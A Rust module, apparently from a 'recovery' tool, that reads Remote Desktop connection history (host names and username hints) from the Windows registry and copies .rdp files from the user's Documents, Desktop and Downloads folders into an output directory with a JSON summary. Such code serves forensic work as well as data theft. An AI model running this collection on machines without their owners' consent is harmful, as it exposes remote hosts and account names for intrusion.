use crate::recovery::{
    context::RecoveryContext,
    output::write_json_artifact,
    task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask},
};
use async_trait::async_trait;
use serde::Serialize;
use std::path::PathBuf;
use std::sync::Arc;
use tokio::fs;
use walkdir::WalkDir;
use winreg::RegKey;
use winreg::enums::HKEY_CURRENT_USER;

pub fn rdp_tasks(ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
    vec![Arc::new(RdpTask::new(ctx))]
}

pub struct RdpTask {
    search_dirs: Vec<PathBuf>,
}

impl RdpTask {
    pub fn new(ctx: &RecoveryContext) -> Self {
        Self {
            search_dirs: vec![
                ctx.home_dir.join("Documents"),
                ctx.home_dir.join("Desktop"),
                ctx.home_dir.join("Downloads"),
            ],
        }
    }
}

#[derive(Serialize)]
struct RdpSummary {
    registry_connections: Vec<RdpRegistryConnection>,
    discovered_files: Vec<String>,
}

#[derive(Serialize)]
struct RdpRegistryConnection {
    host: String,
    username_hint: Option<String>,
}

#[async_trait]
impl RecoveryTask for RdpTask {
    fn label(&self) -> String {
        "RDP Connections".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::System
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut artifacts = Vec::new();
        let registry_connections = collect_registry_rdp();
        
        let mut discovered_files = Vec::new();
        let dest_root = rdp_output_dir(ctx).await?;
        
        for dir in &self.search_dirs {
            if !dir.exists() { continue; }
            
            for entry in WalkDir::new(dir)
                .max_depth(3)
                .into_iter()
                .filter_map(Result::ok)
                .filter(|e| e.file_type().is_file())
            {
                if entry.path().extension().map_or(false, |ext| ext.eq_ignore_ascii_case("rdp")) {
                    let file_path = entry.path();
                    discovered_files.push(file_path.display().to_string());
                    
                    let file_name = file_path.file_name().unwrap_or_default();
                    let dest_path = dest_root.join(file_name);
                    if let Ok(_) = fs::copy(file_path, &dest_path).await {
                        let meta = fs::metadata(&dest_path).await.ok();
                        artifacts.push(RecoveryArtifact {
                            label: "RDP Config".to_string(),
                            path: dest_path,
                            size_bytes: meta.as_ref().map(|m| m.len()).unwrap_or(0),
                            modified: meta.and_then(|m| m.modified().ok()),
                        });
                    }
                }
            }
        }

        let summary = RdpSummary {
            registry_connections,
            discovered_files,
        };

        let artifact = write_json_artifact(
            ctx,
            self.category(),
            &self.label(),
            "rdp-summary.json",
            &summary,
        )
        .await?;
        artifacts.push(artifact);

        Ok(artifacts)
    }
}

fn collect_registry_rdp() -> Vec<RdpRegistryConnection> {
    let mut connections = Vec::new();
    let root = RegKey::predef(HKEY_CURRENT_USER);
    
    if let Ok(key) = root.open_subkey(r"Software\Microsoft\Terminal Server Client\Servers") {
        for name in key.enum_keys().filter_map(Result::ok) {
            if let Ok(server_key) = key.open_subkey(&name) {
                let username_hint = server_key.get_value::<String, _>("UsernameHint").ok();
                connections.push(RdpRegistryConnection {
                    host: name,
                    username_hint,
                });
            }
        }
    }
    
    connections
}

async fn rdp_output_dir(ctx: &RecoveryContext) -> Result<PathBuf, RecoveryError> {
    let folder = ctx
        .output_dir
        .join("services")
        .join("System")
        .join("RDP");
    fs::create_dir_all(&folder).await?;
    Ok(folder)
}
